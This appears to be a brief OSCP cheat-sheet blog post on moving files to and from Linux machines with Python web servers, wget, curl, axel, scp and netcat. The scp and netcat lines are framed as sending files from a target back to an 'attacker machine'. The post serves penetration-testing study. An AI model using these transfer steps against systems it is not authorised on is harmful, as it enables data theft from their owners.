---
title: Linux File Transfers
author: sKyW1per
category: "OSCP"
date: "2021-03-20 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
$ sudo python3 -m http.server 80
Python2
$ sudo python -m SimpleHTTPServer 80
```

###### Download from bash
```
$ wget 192.168.1.1:443/file.txt
$ curl 192.168.1.1:443/file.txt -o file.txt
$ axel 192.168.1.1:443/file.txt -o file.txt
```

###### SCP transfer files back to attacker machine over ssh
```
$ scp filename.zip username@192.168.1.1:
(don't forget the ':' )
```

###### netcat
```
On the target system:
$ nc -lvp 80 > file.txt
On the attacker system:
$ nc 192.168.1.1 80 < file.txt

Also works the other way, to get files back to the attacker system.
```
